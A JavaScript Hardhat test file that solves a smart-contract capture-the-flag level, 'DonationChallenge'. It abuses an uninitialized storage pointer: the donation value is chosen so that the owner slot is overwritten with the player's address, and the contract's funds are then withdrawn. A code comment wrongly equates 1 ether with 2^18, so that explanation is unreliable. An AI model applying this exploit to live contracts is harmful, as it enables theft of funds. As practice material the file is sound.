const { assert } = require("chai");
const { deployContract } = require("ethereum-waffle");
const { BigNumber } = require("ethers");
const { ethers, getNamedAccounts } = require("hardhat");

describe("11-DonationChallenge", function () {
    let targetContract, forceFundsContract, player;
    beforeEach(async function () {
        //make a snapshot by calling fixture
        await deployments.fixture("11");
        deployer = (await getNamedAccounts()).deployer;
        player = (await getNamedAccounts()).player;
        //connect with player
        targetContract = await ethers.getContract("DonationChallenge", player);
    });
    // read about uninitialized pointer. always check compilers errors
    //Donation donation is an unitialized pointer and points to storage 0. timestamp points to storage 0, etherAmount points to storage 1
    // where owner is stored
    describe("donate, isComplete", async function () {
        it("find the amount to donate, call donate and get smart contract ownership", async function () {
            const divisor = BigNumber.from(10).pow(18);
            //1461501637330 902918203684832716 283019655932542975 max uint160 value in decimal
            //smart contract etherAmount parameter is divided with 2^18 * 1 ethers; 1 ethers is a syntetic sugar for to 2^18
            const value = BigNumber.from(player).div(divisor).div(divisor);

            await targetContract.donate(player, { value: value });
            await targetContract.withdraw();

            const isComplete = await targetContract.isComplete();
            assert.equal(isComplete, true);
        });
    });
});
